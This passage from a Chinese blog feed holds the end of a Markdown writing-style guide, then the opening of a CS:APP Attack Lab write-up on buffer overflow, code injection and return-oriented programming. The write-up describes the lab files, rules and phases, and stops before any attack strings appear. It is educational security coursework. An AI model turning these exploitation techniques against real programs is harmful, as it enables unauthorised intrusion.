<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">短文章的标题层级</span><br><span class="line"></span><br><span class="line"><span class="section">### 正文的小标题</span></span><br><span class="line"></span><br><span class="line"><span class="strong">**三级标题 A**</span></span><br><span class="line"><span class="bullet">-</span> 论据 1（五级标题） </span><br><span class="line"><span class="bullet">  -</span> 细分论据 1（六级标题） </span><br><span class="line"><span class="bullet">  -</span> 细分论据 2（六级标题） </span><br><span class="line"><span class="bullet">  -</span> 细分论据 3（六级标题） </span><br><span class="line"><span class="bullet">-</span> 论据 2 </span><br><span class="line"><span class="bullet">-</span> 论据 3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="strong">**三级标题 B**</span></span><br><span class="line"><span class="bullet">1.</span> 论据</span><br><span class="line"><span class="bullet">2.</span> 论据</span><br><span class="line"><span class="bullet">3.</span> 论据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="strong">**三级标题 C**</span></span><br><span class="line"><span class="bullet">-</span> 论据 1 </span><br><span class="line"><span class="bullet">-</span> 论据 2 </span><br><span class="line"><span class="bullet">-</span> 论据 3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">长文章的标题层级</span><br><span class="line"></span><br><span class="line"><span class="section">### 正文的小标题 </span></span><br><span class="line"></span><br><span class="line"><span class="section">#### 正文的三级标题 A</span></span><br><span class="line"></span><br><span class="line"><span class="section">#### 正文的三级标题 B</span></span><br><span class="line"></span><br><span class="line"><span class="section">#### 正文的三级标题 C</span></span><br></pre></td></tr></table></figure></li>
<li><p>二级标题下，不能直接出现四级标题。</p>
</li>
<li><p>标题要避免孤立编号（即同级标题只有一个）。</p>
</li>
<li><p>标题要简短，结尾不带标点符号。</p>
</li>
<li><p>（源码上）标题前后空一行（段前距和段后距）。</p>
</li>
<li><p>大标题和小标题之间要有内容过渡（引出或概括下文）。</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># Title</span></span><br><span class="line"></span><br><span class="line">开门见山地告诉读者这篇文章讲什么？</span><br><span class="line"></span><br><span class="line">一级标题作为文章的（页面）标题（H1），并且尽可能和文件名称保持一致。</span><br><span class="line"></span><br><span class="line">如果文章很长，使用 [TOC] 生成目录。</span><br><span class="line"></span><br><span class="line"><span class="meta">## What</span></span><br><span class="line"></span><br><span class="line">先定义问题是什么？……</span><br><span class="line"></span><br><span class="line">正文从二级标题开始。</span><br><span class="line"></span><br><span class="line"><span class="meta">## Why</span></span><br><span class="line"></span><br><span class="line">为什么会出现这样的问题？……</span><br><span class="line"></span><br><span class="line"><span class="meta">## How</span></span><br><span class="line"></span><br><span class="line">下一步该怎么办？……</span><br><span class="line"></span><br><span class="line"><span class="meta">## See also</span></span><br><span class="line"></span><br><span class="line">文末别忘了贴上参考链接。</span><br><span class="line"></span><br><span class="line">* https:<span class="comment">//link-to-more-info</span></span><br></pre></td></tr></table></figure>
<h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3></li>
</ul>
<h4 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h4><p>使用 <code>‐</code> 或 <code>*</code> 或 <code>+</code> 并跟随 1 个空格来表示无序列表。建议使用 <code>‐</code>（连字符，hyphen）。</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="bullet">- </span>我是谁</span><br><span class="line"><span class="bullet">- </span>我从哪里来</span><br><span class="line"><span class="bullet">- </span>我到哪里去</span><br></pre></td></tr></table></figure>
<p><strong>不建议</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">*</span> <span class="string">我是谁</span></span><br><span class="line"><span class="string">*</span> <span class="string">我从哪里来</span></span><br><span class="line"><span class="string">*</span> <span class="string">我到哪里去</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"></span><br><span class="line"><span class="string">+</span> <span class="string">我是谁</span></span><br><span class="line"><span class="string">+</span> <span class="string">我从哪里来</span></span><br><span class="line"><span class="string">+</span> <span class="string">我到哪里去</span></span><br></pre></td></tr></table></figure>
<p><strong>为什么</strong></p>
<ul>
<li>星号 <code>*</code> 可能和加粗和斜体符号产生混淆。</li>
<li>加号 <code>+</code> 不流行。</li>
</ul>
<p><strong>与其他语法结合使用</strong></p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="bullet">- </span><span class="strong">**《春日》**</span>：等闲识得东风面，万紫千红总是春。</span><br><span class="line"><span class="bullet">- </span><span class="strong">**《春草》**</span>：萋萋总是无情物，吹绿东风又一年。</span><br><span class="line"><span class="bullet">- </span><span class="strong">**《墨梅》**</span>：犹恨东风无意思，更吹烟雨暗黄昏。</span><br></pre></td></tr></table></figure>
<p><strong>预览</strong></p>
<ul>
<li><strong>《春日》</strong>：等闲识得东风面，万紫千红总是春。</li>
<li><strong>《春草》</strong>：萋萋总是无情物，吹绿东风又一年。</li>
<li><strong>《墨梅》</strong>：犹恨东风无意思，更吹烟雨暗黄昏。</li>
</ul>
<h4 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h4><h5 id="语法一（手动排序）"><a href="#语法一（手动排序）" class="headerlink" title="语法一（手动排序）"></a><strong>语法一（手动排序）</strong></h5><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span> 斜月沉沉藏海雾，碣石潇湘无限路。</span><br><span class="line"><span class="bullet">2.</span> 不知乘月几人归，落月摇情满江树。</span><br><span class="line"><span class="bullet">3.</span> 春江潮水连海平，海上明月共潮生。</span><br></pre></td></tr></table></figure>
<p><strong>预览</strong></p>
<ol>
<li>斜月沉沉藏海雾，碣石潇湘无限路。</li>
<li>不知乘月几人归，落月摇情满江树。</li>
<li>春江潮水连海平，海上明月共潮生。</li>
</ol>
<p>对于比较短的、很少修改的有序列表，请按顺序标号，保持源码的可读性。</p>
<h5 id="语法二（自动排序）"><a href="#语法二（自动排序）" class="headerlink" title="语法二（自动排序）"></a><strong>语法二（自动排序）</strong></h5><p>对于比较长的、可能会修改的列表（尤其是很长的嵌套列表），请使用「懒人编号法」。纵使有新的列表项「插队」，把序号弄乱了也没关系，Markdown 编辑器自动会对序号进行纠错。</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span>  Foo.</span><br><span class="line"><span class="bullet">1.</span>  Bar.</span><br><span class="line"><span class="bullet">    1.</span> Foofoo.</span><br><span class="line"><span class="bullet">    1.</span> Barbar.</span><br><span class="line"><span class="bullet">    1.</span> Gargar</span><br><span class="line"><span class="bullet">1.</span>  Baz.</span><br></pre></td></tr></table></figure>
<p><strong>预览</strong></p>
<ol>
<li>Foo.</li>
<li>Bar.<ol>
<li>Foofoo.</li>
<li>Barbar.</li>
<li>Gargar</li>
</ol>
</li>
<li>Baz.</li>
</ol>
<h4 id="嵌套列表"><a href="#嵌套列表" class="headerlink" title="嵌套列表"></a>嵌套列表</h4><p>缩进 2 ~ 4 个空格或一个 Tab（推荐），可以嵌套列表。</p>
<p><strong>示例一</strong></p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span>  不知乘月几人归，落月摇情满江树。</span><br><span class="line"><span class="bullet">	-</span> 与君吟弄风月，端不负平生。</span><br><span class="line"><span class="bullet">	-</span> 对秋深，离恨苦，数夜满庭风雨。</span><br><span class="line"><span class="bullet">	-</span> 五月畲田收火米，三更津吏报潮鸡。</span><br><span class="line"><span class="bullet">2.</span>  人姝丽，粉香吹下，夜寒风细。</span><br><span class="line"><span class="bullet">	-</span> 弓弦抱汉月，马足践胡尘。</span><br><span class="line"><span class="bullet">	-</span> 寒月悲笳，万里西风瀚海沙。</span><br><span class="line"><span class="bullet">	-</span> 东堂坐见山，云风相吹嘘。</span><br><span class="line"><span class="bullet">3.</span>  沅溪夏晚足凉风，春酒相携就竹丛。</span><br><span class="line"><span class="bullet">	-</span> 白发渔樵江渚上，惯看秋月春风。</span><br><span class="line"><span class="bullet">	-</span> 归来独卧逍遥夜，梦里相逢酩酊天。</span><br><span class="line"><span class="bullet">	-</span> 致君尧舜上，再使风俗淳。</span><br></pre></td></tr></table></figure>
<p><strong>预览</strong></p>
<ol>
<li>不知乘月几人归，落月摇情满江树。<ul>
<li>与君吟弄风月，端不负平生。</li>
<li>对秋深，离恨苦，数夜满庭风雨。</li>
<li>五月畲田收火米，三更津吏报潮鸡。</li>
</ul>
</li>
<li>人姝丽，粉香吹下，夜寒风细。<ul>
<li>弓弦抱汉月，马足践胡尘。</li>
<li>寒月悲笳，万里西风瀚海沙。</li>
<li>东堂坐见山，云风相吹嘘。</li>
</ul>
</li>
<li>沅溪夏晚足凉风，春酒相携就竹丛。<ul>
<li>白发渔樵江渚上，惯看秋月春风。</li>
<li>归来独卧逍遥夜，梦里相逢酩酊天。</li>
<li>致君尧舜上，再使风俗淳。</li>
</ul>
</li>
</ol>
<p><strong>示例二</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">- SupTalk</span><br><span class="line"><span class="meta">	&gt;</span><span class="bash"> - Home</span></span><br><span class="line"><span class="meta">	&gt;</span><span class="bash"> - Tags</span>  </span><br><span class="line"><span class="meta">	&gt;</span><span class="bash"> - Archives</span></span><br><span class="line">- Contact me</span><br><span class="line"><span class="meta">	&gt;</span><span class="bash"> - Email：superpung.lee(at)gmail.com</span></span><br><span class="line"><span class="meta">	&gt;</span><span class="bash"> - Telegram：t.me/super_lee</span></span><br><span class="line"><span class="meta">	&gt;</span><span class="bash"> - WeChat：superexi</span></span><br></pre></td></tr></table></figure>
<p><strong>预览</strong></p>
<ul>
<li><p>Sup</p>
<blockquote>
<ul>
<li>Home</li>
<li>Tags  </li>
<li>Archives</li>
</ul>
</blockquote>
</li>
<li><p>Contact me</p>
<blockquote>
<ul>
<li>Email：superpung.lee(at)gmail.com</li>
<li>Telegram：t.me/super_lee</li>
<li>WeChat：superexi</li>
</ul>
</blockquote>
</li>
</ul>
<p><strong>Tips</strong></p>
<ul>
<li><code>Tab</code> 缩进一级</li>
<li><code>Shift + Tab</code> 提升一级</li>
</ul>
<h4 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a>任务列表</h4><p><strong>语法</strong></p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="bullet">- </span>[ ] 纯牛奶</span><br><span class="line"><span class="bullet">- </span>[x] 西瓜</span><br><span class="line"><span class="bullet">- </span>[ ] 鸡蛋</span><br><span class="line"><span class="bullet">- </span>[x] 保鲜膜</span><br><span class="line"><span class="bullet">- </span>[ ] 猪肉（暂时买不起）</span><br></pre></td></tr></table></figure>
<p><strong>预览</strong></p>
<ul>
<li><input disabled="" type="checkbox"> 纯牛奶</li>
<li><input checked="" disabled="" type="checkbox"> 西瓜</li>
<li><input disabled="" type="checkbox"> 鸡蛋</li>
<li><input checked="" disabled="" type="checkbox"> 保鲜膜</li>
<li><input disabled="" type="checkbox"> 猪肉（暂时买不起）</li>
</ul>
<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>在每一行使用 <code>&gt;</code> 符号，包括换行的句子。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; 我们是为人民服务的，所以，我们如果有缺点，就不怕别人批评指出。</span><br><span class="line">&gt; by 毛泽东：《为人民服务》（1944 年 9 月 8 日）</span><br></pre></td></tr></table></figure>
<blockquote>
<p>我们是为人民服务的，所以，我们如果有缺点，就不怕别人批评指出。<br>by 毛泽东：《为人民服务》（1944 年 9 月 8 日）</p>
</blockquote>
<h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><p><strong>语法</strong></p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">| 左对齐           |                      居中对齐                      | 右对齐 |</span><br><span class="line">| <span class="symbol">:---------------</span> | <span class="symbol">:------------------------------------------------</span>: | -----: |</span><br><span class="line">| **加粗**         |          [插入链接](<span class="symbol">https:</span>/<span class="regexp">/www.superpung.xyz/</span>)          |  ￥<span class="number">5.7</span> |</span><br><span class="line">| `换行`&lt;br /&gt;下一行 | ![插入图片](<span class="symbol">https:</span>/<span class="regexp">/super-bucket1.oss-cn-beijing.aliyuncs.com/</span>ExiTalk.png) | ￥<span class="number">10.4</span> |</span><br></pre></td></tr></table></figure>
<p><strong>预览</strong></p>
<table>
<thead>
<tr>
<th align="left">左对齐</th>
<th align="center">居中对齐</th>
<th align="right">右对齐</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>加粗</strong></td>
<td align="center"><a href="https://tingtalk.me/">插入链接</a></td>
<td align="right">￥5.7</td>
</tr>
<tr>
<td align="left"><code>换行</code> 下一行</td>
<td align="center"><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png" alt="插入图片"></td>
<td align="right">￥10.4</td>
</tr>
</tbody></table>
<p><strong>注释</strong></p>
<ul>
<li>Markdown 是轻量级的标记语言，所以不支持合并和拆分单元格。对于复杂表格，你可以在 Markdown 编辑器中使用 HTML 的 <code>&lt;table&gt;</code> 标签标记。</li>
<li>输入 <code>&lt;br /&gt;</code> 可以换行（但不建议使用）。</li>
<li>把 Excel 表格复制粘贴到某些 Markdown 编辑器（例如 Typora）可以直接转换为 Markdown 形式的表格。</li>
</ul>
<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p><strong>语法</strong></p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[SupTalk]</span>(<span class="attribute">https</span>:<span class="comment">//www.superpung.xyz/)</span></span><br></pre></td></tr></table></figure>
<p><strong>预览</strong>：<a href="https://www.superpung.xyz/">SupTalk</a></p>
<h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><p><strong>语法</strong></p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line">!<span class="selector-attr">[ExiTalk Official Account]</span>(<span class="attribute">https</span>:<span class="comment">//super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png)</span></span><br></pre></td></tr></table></figure>
<p><strong>预览</strong></p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png" alt="ExiTalk Official Account"></p>
<p>Markdown 是一种纯文本标记语言，图片功能注定是它的弱项。</p>
<p><strong>网络图床</strong></p>
<p>但谁能保证哪个图床服务不倒闭？所以我在写作的时候，力求用文字把事情解释清楚，能不插入图片就不插入图片。我会用到的 <a href="https://sspai.com/search/article?q=%E5%9B%BE%E5%BA%8A">图床</a> 是阿里云 OSS。</p>
<p><strong>本地图片</strong></p>
<p>Typora 支持插入本地图片，但是更改图片的路径和名称，图片就失效了。如果文章已经完稿了，可以把 Markdown 导出为 PDF 文档（这样图片就嵌入进去了）。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><h4 id="行内代码"><a href="#行内代码" class="headerlink" title="行内代码"></a>行内代码</h4><p><strong>用 2 个重音符 `（backtick，在 Tab 键上方）包裹</strong></p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">`Markdown` 是一种轻量级标记语言。</span><br></pre></td></tr></table></figure>
<p><strong>预览</strong></p>
<p><code>Markdown</code> 是一种轻量级标记语言。</p>
<p>用两个 <code>包裹</code>，才能显示 ```：</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">A</span> <span class="selector-tag">single</span> <span class="selector-tag">backtick</span> <span class="selector-tag">in</span> <span class="selector-tag">a</span> <span class="selector-tag">code</span> <span class="selector-tag">span</span>: `` ` ``</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">A</span> <span class="selector-tag">backtick-delimited</span> <span class="selector-tag">string</span> <span class="selector-tag">in</span> <span class="selector-tag">a</span> <span class="selector-tag">code</span> <span class="selector-tag">span</span>: `` `<span class="selector-tag">foo</span>` ``</span><br></pre></td></tr></table></figure>
<p><strong>预览</strong><br>A single backtick in a code span: ```<br>A backtick-delimited string in a code span: <code>foo</code></p>
<p><strong>重音符前后空一格</strong></p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">- 推荐：使用键盘快捷键 `Ctrl + D` 可以将当前网页保存为书签。</span><br><span class="line">- 反对：使用键盘快捷键`Ctrl+D`可以将当前网页保存为书签。</span><br></pre></td></tr></table></figure>
<p><strong>预览</strong></p>
<ul>
<li>推荐：使用键盘快捷键 <code>Ctrl + D</code> 可以将当前网页保存为书签。</li>
<li>反对：使用键盘快捷键<code>Ctrl+D</code>可以将当前网页保存为书签。</li>
</ul>
<h4 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h4><p>将 3 个重音符 ` 置于代码块的首行和末行。首行的重音符后面可接代码语言名称，例如 `````python``，以达到相应的代码高亮效果。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">print</span> <span class="string">&quot;Hello, Python!&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>预览</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">print</span> <span class="string">&quot;Hello, Python!&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong><a href="https://blog.alispit.tel/create-a-git-diff-in-markdown/">diff 代码对比</a></strong></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title">addTwoNumbers</span> (num1, num2) &#123;</span><br><span class="line">-  <span class="keyword">return</span> <span class="type">1</span> + <span class="number">2</span></span><br><span class="line">+  <span class="keyword">return</span> num1 + num2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>预览</strong></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title">addTwoNumbers</span> (num1, num2) &#123;</span><br><span class="line">-  <span class="keyword">return</span> <span class="type">1</span> + <span class="number">2</span></span><br><span class="line">+  <span class="keyword">return</span> num1 + num2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h3><blockquote>
<p>以下键盘快捷键（语法）可能仅支持 Typora。</p>
</blockquote>
<p><code>Enter</code> = 换行 + 空行 = (<code>Shift</code> + <code>Enter</code>) × 2。</p>
<p>即按下回车键创建一个新段落（段与段之间加入空行）。</p>
<h4 id="软换行"><a href="#软换行" class="headerlink" title="软换行"></a>软换行</h4><p><code>Shift</code> + <code>Enter</code> = 换行（但是不会产生空行）。</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">`enticing` [ɪn&#x27;taɪsɪŋ] （事物）诱人的，有吸引力的；迷人的</span><br><span class="line">- Her neck was short but rounded <span class="literal">and</span> her arms plump <span class="literal">and</span> enticing. `Shift` + `Enter`</span><br><span class="line">  她的脖子短，但浑圆可爱；两臂丰腴，也很动人。by 《飘》 `Enter`</span><br><span class="line"></span><br><span class="line">- This was enticing to Wozniak, even more than any prospect of getting rich. `Shift` + `Enter`</span><br><span class="line">  这句话对沃兹尼亚克的诱惑太大了，比变成富人的诱惑还要大。by 《乔布斯传》 `Enter`</span><br></pre></td></tr></table></figure>
<p><code>enticing</code> [ɪn’taɪsɪŋ] （事物）诱人的，有吸引力的；迷人的</p>
<ul>
<li>Her neck was short but rounded and her arms plump and enticing.<br>她的脖子短，但浑圆可爱；两臂丰腴，也很动人。by 《飘》</li>
<li>This was enticing to Wozniak, even more than any prospect of getting rich.<br>这句话对沃兹尼亚克的诱惑太大了，比变成富人的诱惑还要大。by 《乔布斯传》</li>
</ul>
<h4 id="硬换行"><a href="#硬换行" class="headerlink" title="硬换行"></a>硬换行</h4><p>在行末使用空格（两个以上） + 换行（Enter），就可以实现强制换行，此语法适用于大部分 Markdown 编辑器。</p>
<p>硬换行在文档被导出时将被保留，且没有换段的段后距。</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">假如生活欺骗了你，  （<span class="number">2</span> 个空格）</span><br><span class="line">不要悲伤，不要心急！  （<span class="number">2</span> 个空格）</span><br><span class="line">忧郁的日子里须要镇静：  （<span class="number">2</span> 个空格）（<span class="number">2</span> 个空格）</span><br><span class="line">相信吧，快乐的日子将会来临！  （<span class="number">2</span> 个空格）</span><br><span class="line">心儿永远向往着未来；  （<span class="number">2</span> 个空格）</span><br><span class="line">现在却常是忧郁。  （<span class="number">2</span> 个空格）</span><br><span class="line">一切都是瞬息，一切都将会过去；  （<span class="number">2</span> 个空格）</span><br><span class="line">而那过去了的，就会成为亲切的怀恋。   （<span class="number">2</span> 个空格）</span><br><span class="line"><span class="keyword">by</span> 普希金</span><br></pre></td></tr></table></figure>
<p>假如生活欺骗了你，<br>不要悲伤，不要心急！<br>忧郁的日子里须要镇静：<br>相信吧，快乐的日子将会来临！<br>心儿永远向往着未来；<br>现在却常是忧郁。<br>一切都是瞬息，一切都将会过去；<br>而那过去了的，就会成为亲切的怀恋。<br>by 普希金</p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><table>
<thead>
<tr>
<th>名称</th>
<th>语法</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>分割线</td>
<td><code>---</code>、<code>***</code>、<code>+++</code></td>
<td>不常用</td>
</tr>
<tr>
<td>内容目录</td>
<td>[TOC]</td>
<td>Table of Contents</td>
</tr>
</tbody></table>
<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>Markdown 的用途很广。Write once, export everywhere：写博客、写邮件、排推文、做 PPT 等。</p>
<h3 id="公众号排版"><a href="#公众号排版" class="headerlink" title="公众号排版"></a>公众号排版</h3><ul>
<li><a href="https://mdnice.com/">Markdown Nice</a>：让微信排版变 Nice，支持自定义主题 CSS。</li>
<li><a href="https://doocs.github.io/md/">微信 Markdown 编辑器</a>：高度简洁。</li>
<li><a href="https://knb.im/mp/">可能吧公众号 Style 一键转换器</a>：老司机禅叔出品。</li>
</ul>
<h3 id="简历排版"><a href="#简历排版" class="headerlink" title="简历排版"></a>简历排版</h3><ul>
<li><a href="http://cv.ftqq.com/#">冷熊简历</a></li>
<li><a href="https://resume.mdnice.com/">resume.mdnice.com</a></li>
<li><a href="https://resumd.t9t.io/">Resumd</a></li>
</ul>
<h3 id="邮件排版"><a href="#邮件排版" class="headerlink" title="邮件排版"></a>邮件排版</h3><p><a href="https://markdown-here.com/">Markdown Here</a> 是一个浏览器扩展插件，可以将浏览器中编辑器（例如 email 正文）里的 Markdown 文本转换成渲染过后的 HTML，并且支持自定义 CSS。详情移步 <a href="https://sspai.com/post/47189">在富文本在线编辑器中使用 Markdown</a>。</p>
<h3 id="转换为-Word"><a href="#转换为-Word" class="headerlink" title="转换为 Word"></a>转换为 Word</h3><ul>
<li>安装 Pandoc 后，Typora 可以导出 Word</li>
</ul>
<h3 id="转换为-Mind-Map"><a href="#转换为-Mind-Map" class="headerlink" title="转换为 Mind Map"></a>转换为 Mind Map</h3><ul>
<li>对于 <a href="https://www.xmind.cn/">Xmind</a> / <a href="https://mindnode.com/">MindNode</a> / <a href="http://naotu.baidu.com/">百度脑图</a> 等思维导图工具，直接导入 md 文档。</li>
<li>对于幕布，可以用 Typora 导出 opml 格式，再导入。</li>
<li><a href="https://markmap.js.org/">Markmap</a>：<code>Mark</code>down + Mind<code>map</code>，使用思维导图可视化 Markdown。</li>
</ul>
<h3 id="从网页导出-md-格式"><a href="#从网页导出-md-格式" class="headerlink" title="从网页导出 md 格式"></a>从网页导出 md 格式</h3><p>借助浏览器插件 <a href="https://chrome.google.com/webstore/detail/simpread-reader-view/ijllcpnolfcooahcekpamkbidhejabll">简约</a> 导出 md 格式的网页，不用 手动添加标记符号。</p>
<h3 id="导出漂亮的-Markdown-源代码图片"><a href="#导出漂亮的-Markdown-源代码图片" class="headerlink" title="导出漂亮的 Markdown 源代码图片"></a>导出漂亮的 Markdown 源代码图片</h3><ol>
<li>打开 <a href="http://carbon.now.sh/">carbon.now.sh</a></li>
<li>语言选择 <code>Markdown</code></li>
<li>书写或者粘贴 Markdown 源代码</li>
<li>导出 PNG 像素图或者 SVG 矢量图</li>
</ol>
<blockquote>
<p>参考</p>
<ul>
<li><a href="https://tingtalk.me/markdown/">Markdown 入门教程及书写风格指南 | 庭说</a></li>
</ul>
<p>后记</p>
<ul>
<li>“写文章”此部分摘抄自 <a href="https://tingtalk.me/">庭说</a>，部分内容有所修改。</li>
<li>「庭说」是我目前唯一的“友链”，其中诸多优秀的文章给了我很大启发，在此再次对「庭说」的博主钟哥表示感谢，同时也感谢他为中文互联网做出的贡献。</li>
</ul>
</blockquote>
]]></content>
      <tags>
        <tag>Notes</tag>
      </tags>
  </entry>
  <entry>
    <title>缓冲区溢出漏洞竟然可以被用来攻击！</title>
    <url>/Attack-Lab/</url>
    <content><![CDATA[<p>CS:APP - Lab assignments #3 - Attack Lab: Understanding Buffer Overflow Bugs</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<p><strong><em>若参考或转载请注明出处</em></strong></p>
<p>本实验通过代码注入攻击、<a href="https://zh.wikipedia.org/zh-cn/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B">面向返回编程（Return-Oriented Programming，ROP）</a>攻击来帮助理解缓冲区溢出的危害。你将研究CS:APP3e的第3.10.3和3.10.4节，作为该实验的参考资料。</p>
<p>注意：</p>
<p>在本实验中，你将获得用于利用操作系统和网络服务器中的安全漏洞的方法的第一手经验。 我们的目的是帮助你了解程序的运行时操作，并了解这些安全漏洞的性质，以便在编写系统代码时可以避免它们。 我们不容忍使用任何其他形式的攻击来获得对任何系统资源的未经授权的访问。</p>
<p>完成此实验后：</p>
<ul>
<li>你将学习攻击者利用安全漏洞的不同方法，当程序不能很好地保护自己免受缓冲区溢出的侵害时；</li>
<li>你将更好地了解如何编写更安全的程序，以及编译器和操作系统提供的一些功能，以使程序更不容易受到攻击；</li>
<li>你将对x86-64机器代码的堆栈和参数传递机制有更深入的了解；</li>
<li>你将对x86-64指令的编码方式有更深入的了解；</li>
<li>你将获得有关调试工具（例如<code>gdb</code>和<code>objdump</code>）的更多经验。</li>
</ul>
<p>以下是有关此实验有效解决方案的一些重要规则的摘要。 当你第一次阅读本文档时，这些要点没有多大意义。 一旦开始，它们将在此处作为规则的主要参考。</p>
<ul>
<li>你必须在与生成<code>target</code>的计算机相似的计算机上进行此实验。</li>
<li>你的解决方案可能不会使用攻击来规避程序中的验证代码。 具体来说，你将任何包含在<code>ret</code>指令中的攻击字符串中的地址都应指向以下目标之一：<ul>
<li>函数<code>touch1</code>、<code>touch2</code>或<code>touch3</code>的地址。</li>
<li>你注入的代码的地址。</li>
<li>来自<code>gadget farm</code>的一个<code>gadget</code>的地址。</li>
</ul>
</li>
<li>你只能从文件<code>rtarget</code>构造<code>gadget</code>，其地址范围介于函数<code>start_farm</code>和<code>end_farm</code>之间。</li>
</ul>
<p>本文所有操作均基于以下环境：</p>
<ul>
<li>OS: Ubuntu 18.04.4 LTS (Linux ubuntu 5.3.0-46-generic x86_64)</li>
<li>Debugger: GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git</li>
<li>Compiler: gcc version 7.5.0</li>
</ul>
<p><em>有关实验的基本介绍参见实验说明（公众号后台回复“<code>attack lab</code>”即可下载）。</em></p>
<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>阅读<code>README.txt</code>，可以发现：</p>
<ul>
<li><p><code>ctarget</code>：易受代码注入攻击的可执行程序（对应Part I即课程要求部分）；</p>
</li>
<li><p><code>rtarget</code>：易受ROP攻击的可执行程序（对应Part II）；</p>
</li>
<li><p><code>cookie.txt</code>：8位十六进制代码<code>cookie</code>，你将在攻击中将其用作唯一标识符；</p>
</li>
<li><p><code>farm.c</code>：目标的<code>gadget farm</code>的源代码，将用于ROP攻击；</p>
</li>
<li><p><code>hex2raw</code>：用于生成攻击字符串的实用程序。</p>
</li>
</ul>
<p><em>若完成课程要求部分，则只需用到 <code>ctarget</code>、<code>cookie.txt</code>和<code>hex2raw</code>。</em></p>
<p>下图总结了实验的五个阶段。可以看出，前三个涉及对<code>catrget</code>的代码注入（CI）攻击（课程要求），而后两个涉及对<code>rtarget</code>的面向返回编程（ROP）攻击（课程未做要求）。</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/Summary_of_attack_lab_phases.png" alt="Summary_of_attack_lab_phases"></p>
<p><code>ctarget</code>和<code>rtarget</code>都从标准输入读取字符串，二者都采用几个不同的命令行参数：</p>
<ul>
<li><code>-h</code>：打印可能的命令行参数列表</li>
<li><code>-q</code>：不将结果发送到评分服务器（自学者<strong>必须</strong>在运行时加上此参数，否则会由于服务器不存在而报错）</li>
<li><code>-i &lt;FILE&gt;</code>：从文件而不是标准输入提供输入</li>
</ul>
<p>与<code>Bomb Lab</code>不同，在此实验犯错误不会受到任何惩罚。 随意使用你喜欢的任何字符串向<code>ctarget</code>和<code>rtarget</code>开火。</p>
<h1 id="Part-I-Code-Injection-Attacks"><a href="#Part-I-Code-Injection-Attacks" class="headerlink" title="Part I: Code Injection Attacks"></a>Part I: Code Injection Attacks</h1><blockquote>
<p>在前三个阶段中，你将<strong>利用字符串攻击<code>ctarget</code>**。设置该程序的方式是，从一次运行到下一次运行，堆栈位置将保持一致，以便将堆栈上的数据视为可执行代码。这些功能使程序容易受到攻击，当你利用</strong>包含可执行代码的字节编码<strong>（机器码，即汇编文件中地址右侧的若干字节）</strong>的字符串**时。</p>
</blockquote>
<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><blockquote>
